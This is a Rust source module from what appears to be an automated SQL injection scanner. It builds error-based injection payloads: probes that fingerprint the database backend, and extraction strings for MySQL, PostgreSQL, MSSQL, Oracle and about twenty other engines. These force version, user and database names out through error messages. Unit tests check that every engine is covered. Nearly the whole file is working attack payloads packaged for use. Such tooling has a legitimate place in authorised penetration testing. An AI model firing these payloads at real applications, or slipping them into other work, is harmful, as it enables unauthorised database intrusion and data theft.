//! Error-based SQL injection generators.
//!
//! Two families:
//!  1. *Fingerprint* probes — malformed fragments that make each DBMS emit a
//!     dialect-specific parser error, used to identify the backend.
//!  2. *Extraction* probes — the advanced technique: coerce the DBMS into
//!     leaking query results **inside an error message** (extractvalue,
//!     updatexml, double-query/floor, CAST/CONVERT type confusion, Oracle
//!     XMLType/CTXSYS). These carry a recognizable `~` delimiter so the leaked
//!     value is trivial to locate in the response.
//!
//! No trivial `1=1` tautologies live here — every extraction probe pulls a
//! real value (`version()`, `user()`, `database()`) back through the error
//! channel.

use super::GeneratedPayload;
use crate::clause_map::SqlClause;
use crate::detection::DbmsFamily;
use crate::types::ProbeType;

/// Delimiter wrapped around leaked values so they stand out in error text.
pub const LEAK_DELIM: &str = "~";

fn probe(
    name: &str,
    payload: &str,
    dbms: Option<DbmsFamily>,
    clause: Option<SqlClause>,
) -> GeneratedPayload {
    GeneratedPayload {
        name: name.to_string(),
        probe_type: ProbeType::ErrorInjection,
        payload_str: payload.to_string(),
        expected_dbms: dbms,
        clause,
    }
}

pub fn generate() -> Vec<GeneratedPayload> {
    let mut out = Vec::new();
    out.extend(fingerprint_probes());
    out.extend(extraction_probes());
    out.extend(new_family_extraction_probes());
    out
}

/// Malformed fragments that provoke dialect-specific parser errors.
fn fingerprint_probes() -> Vec<GeneratedPayload> {
    use DbmsFamily::*;
    vec![
        probe("error-unbalanced-quote", "'", None, None),
        probe("error-double-quote-garbage", "\"'", None, None),
        // MySQL/MariaDB tolerate `\'`; PG/MSSQL/Oracle reject the escape.
        probe("error-backslash-escape", "\\'", Some(MySQL), None),
        // `||` concatenation errors on MySQL, parses on PG/Oracle/SQLite.
        probe("error-pipe-concat", "'||'", Some(PostgreSQL), Some(SqlClause::StringConcat)),
        probe("error-open-paren", "')", None, None),
        probe("error-comment-truncate", "'-- -", None, Some(SqlClause::Comment)),
    ]
}

/// Advanced error-based extraction: leak a real value through the error text.
fn extraction_probes() -> Vec<GeneratedPayload> {
    use DbmsFamily::*;
    vec![
        // --- MySQL / MariaDB -------------------------------------------------
        // extractvalue(): XPATH syntax error echoes the second argument.
        probe(
            "err-mysql-extractvalue",
            "' AND extractvalue(1,concat(0x7e,(SELECT version()),0x7e))-- -",
            Some(MySQL),
            Some(SqlClause::Subquery),
        ),
        // updatexml(): same XPATH leak, different sink.
        probe(
            "err-mysql-updatexml",
            "' AND updatexml(1,concat(0x7e,(SELECT current_user()),0x7e),1)-- -",
            Some(MySQL),
            Some(SqlClause::Subquery),
        ),
        // Double-query / floor(rand) group-by collision — the classic that
        // works when extractvalue/updatexml are unavailable (older MySQL).
        probe(
            "err-mysql-double-query",
            "' AND (SELECT 1 FROM(SELECT count(*),concat((SELECT version()),0x7e,floor(rand(0)*2))x \
             FROM information_schema.tables GROUP BY x)a)-- -",
            Some(MySQL),
            Some(SqlClause::GroupBy),
        ),
        // EXP() overflow leak (MySQL >= 5.5.5).
        probe(
            "err-mysql-exp-overflow",
            "' AND EXP(~(SELECT * FROM(SELECT concat(0x7e,(SELECT user()),0x7e))x))-- -",
            Some(MySQL),
            Some(SqlClause::Subquery),
        ),
        // GTID_SUBSET(): MySQL >= 5.6 rejects a non-GTID first argument and
        // echoes it verbatim — a clean leak when XPATH sinks are patched out.
        probe(
            "err-mysql-gtid-subset",
            "' AND GTID_SUBSET(concat(0x7e,(SELECT database()),0x7e),1)-- -",
            Some(MySQL),
            Some(SqlClause::Subquery),
        ),
        // MariaDB shares the XPATH sinks but is fingerprinted separately, so it
        // needs its own extraction vector to be attributed correctly.
        probe(
            "err-mariadb-extractvalue",
            "' AND extractvalue(1,concat(0x7e,(SELECT version()),0x7e))-- -",
            Some(MariaDB),
            Some(SqlClause::Subquery),
        ),
        // --- PostgreSQL ------------------------------------------------------
        // CAST text->int: "invalid input syntax for integer: <value>".
        probe(
            "err-pg-cast-int",
            "' AND 1=CAST((SELECT version()) AS int)-- -",
            Some(PostgreSQL),
            Some(SqlClause::Cast),
        ),
        probe(
            "err-pg-cast-numeric",
            "' AND 1=CAST((SELECT current_database()) AS numeric)-- -",
            Some(PostgreSQL),
            Some(SqlClause::Cast),
        ),
        // --- MSSQL -----------------------------------------------------------
        // CONVERT int: "Conversion failed when converting the ... value <v>".
        probe(
            "err-mssql-convert",
            "' AND 1=CONVERT(int,(SELECT @@version))-- -",
            Some(MSSQL),
            Some(SqlClause::Cast),
        ),
        probe(
            "err-mssql-db-name",
            "' AND 1=CONVERT(int,(SELECT DB_NAME()))-- -",
            Some(MSSQL),
            Some(SqlClause::Cast),
        ),
        // --- Oracle ----------------------------------------------------------
        // CTXSYS.DRITHSX.SN raises ORA-20000 echoing its argument.
        probe(
            "err-oracle-ctxsys",
            "' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE rownum=1))-- -",
            Some(Oracle),
            Some(SqlClause::Subquery),
        ),
        // XMLType wraps the value in an "LPX-00XXX" / ORA error.
        probe(
            "err-oracle-xmltype",
            "' AND 1=(SELECT UPPER(XMLType(chr(60)||chr(58)||(SELECT user FROM dual)||chr(62))) \
             FROM dual)-- -",
            Some(Oracle),
            Some(SqlClause::Subquery),
        ),
        // --- DB2 / H2 --------------------------------------------------------
        probe(
            "err-db2-cast",
            "' AND 1=(SELECT CAST((VALUES(1)) AS int) FROM sysibm.sysdummy1 \
             WHERE 1=CAST((SELECT service_level FROM sysibmadm.env_inst_info) AS int))-- -",
            Some(DB2),
            Some(SqlClause::Cast),
        ),
        probe(
            "err-h2-cast",
            "' AND 1=CAST((SELECT H2VERSION()) AS int)-- -",
            Some(H2),
            Some(SqlClause::Cast),
        ),
        // SQLite: JSON() reports malformed input and echoes it.
        probe(
            "err-sqlite-json",
            "' AND 1=JSON('~'||(SELECT sqlite_version())||'~')-- -",
            Some(SQLite),
            Some(SqlClause::Cast),
        ),
    ]
}

/// Error-based extraction for the sqlmap-parity engine families.
///
/// One probe per engine, each using the primitive that engine actually
/// exposes (see `payload::vectors` for the full per-engine catalogue: this is
/// the literal probe-layer mirror so the synchronous probe engine can reach
/// the same engines the adaptive engine can).
fn new_family_extraction_probes() -> Vec<GeneratedPayload> {
    use DbmsFamily::*;
    vec![
        // Sybase shares T-SQL's conversion error with MSSQL.
        probe("err-sybase-convert", "' AND 1=CONVERT(int,(SELECT @@version))-- -", Some(Sybase), Some(SqlClause::Cast)),
        // Firebird: BIN_SHL over a BIGINT cast echoes the operand.
        probe("err-firebird-bin-shl", "' AND 1=BIN_SHL(CAST('~'||(SELECT rdb$get_context('SYSTEM','ENGINE_VERSION') FROM rdb$database)||'~' AS BIGINT),1)-- -", Some(Firebird), Some(SqlClause::Cast)),
        // Informix: the character-to-numeric cast quotes the value.
        probe("err-informix-cast", "' AND 1=CAST('~'||(SELECT TRIM(DBINFO('version','full')) FROM systables WHERE tabid=1)||'~' AS INTEGER)-- -", Some(Informix), Some(SqlClause::Cast)),
        // HSQLDB.
        probe("err-hsqldb-cast", "' AND 1=CAST('~'||(SELECT DATABASE_VERSION())||'~' AS int)-- -", Some(HSQLDB), Some(SqlClause::Cast)),
        // SAP MaxDB.
        probe("err-maxdb-to-number", "' AND 1=TO_NUMBER('~'||(SELECT version FROM sysinfo.versions)||'~')-- -", Some(MaxDB), Some(SqlClause::Cast)),
        // SAP HANA.
        probe("err-hana-cast", "' AND 1=CAST('~'||(SELECT VERSION FROM SYS.M_DATABASE)||'~' AS INTEGER)-- -", Some(SAPHANA), Some(SqlClause::Cast)),
        // ClickHouse: strict typing names both sides of a bad comparison.
        probe("err-clickhouse-typing", "' AND 1=('~'||CAST((SELECT version()) AS Nullable(String))||'~')-- -", Some(ClickHouse), Some(SqlClause::Cast)),
        // CUBRID.
        probe("err-cubrid-inet-aton", "' AND 1=INET_ATON('~'||(SELECT version())||'~')-- -", Some(Cubrid), Some(SqlClause::Cast)),
        // Virtuoso.
        probe("err-virtuoso-bit-shift", "' AND 1=bit_shift(CAST('~'||(SELECT sys_stat('st_dbms_name'))||'~' AS INTEGER),1)-- -", Some(Virtuoso), Some(SqlClause::Cast)),
        // MonetDB.
        probe("err-monetdb-ms-trunc", "' AND 1=(SELECT ms_trunc(CAST('~'||CAST((SELECT 1) AS VARCHAR)||'~' AS DECIMAL),1))-- -", Some(MonetDB), Some(SqlClause::Cast)),
        // Vertica.
        probe("err-vertica-numeric", "' AND 1=ZEROIFNULL(CAST('~'||(SELECT version())::varchar||'~' AS NUMERIC))-- -", Some(Vertica), Some(SqlClause::Cast)),
        // InterSystems Cache.
        probe("err-cache-to-posixtime", "' AND 1=TO_POSIXTIME(TO_DATE('~'||(SELECT 1)||'~','YYYY'))-- -", Some(Cache), Some(SqlClause::Cast)),
        // Presto / Trino.
        probe("err-presto-parse-data-size", "' AND 1=PARSE_DATA_SIZE('~'||CAST((SELECT version()) AS VARCHAR)||'~')-- -", Some(Presto), Some(SqlClause::Cast)),
        // Spanner: ERROR() raises with our string as the message.
        probe("err-spanner-error-fn", "' AND ERROR('~'||(SELECT 1)||'~') IS NOT NULL-- -", Some(Spanner), Some(SqlClause::Cast)),
        // Microsoft Access / Jet.
        probe("err-access-cint", "' AND 1=CINT('~'||(SELECT 1)||'~')-- -", Some(Access), Some(SqlClause::Cast)),
    ]
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn emits_fingerprint_and_extraction() {
        let all = generate();
        assert!(all.len() >= 14, "expected a broad probe set, got {}", all.len());
        assert!(all.iter().all(|p| p.probe_type == ProbeType::ErrorInjection));
    }

    #[test]
    fn every_engine_family_gets_an_extraction_probe() {
        // sqlmap ships error-based vectors for 17 engines; the added families
        // must not be decorative, so each one carries a real primitive.
        let probes = extraction_probes()
            .into_iter()
            .chain(new_family_extraction_probes())
            .collect::<Vec<_>>();
        for fam in DbmsFamily::ALL {
            assert!(
                probes.iter().any(|p| p.expected_dbms == Some(*fam)),
                "no error-based extraction probe for {fam:?}"
            );
        }
    }

    #[test]
    fn no_trivial_tautologies() {
        for p in generate() {
            let s = p.payload_str.replace(' ', "");
            assert!(!s.contains("1=1"), "trivial tautology leaked in: {}", p.payload_str);
            assert!(!s.contains("or1=1"), "trivial OR tautology in: {}", p.payload_str);
        }
    }

    #[test]
    fn extraction_probes_pull_real_values() {
        // Every extraction probe references a concrete info function, not a
        // constant, and every DBMS family that has one is represented.
        let ex = extraction_probes();
        assert!(ex.iter().any(|p| p.expected_dbms == Some(DbmsFamily::MySQL)));
        assert!(ex.iter().any(|p| p.expected_dbms == Some(DbmsFamily::PostgreSQL)));
        assert!(ex.iter().any(|p| p.expected_dbms == Some(DbmsFamily::MSSQL)));
        assert!(ex.iter().any(|p| p.expected_dbms == Some(DbmsFamily::Oracle)));
        for p in ex {
            assert!(
                p.payload_str.contains("SELECT"),
                "extraction probe should embed a subquery: {}",
                p.payload_str
            );
        }
    }
}

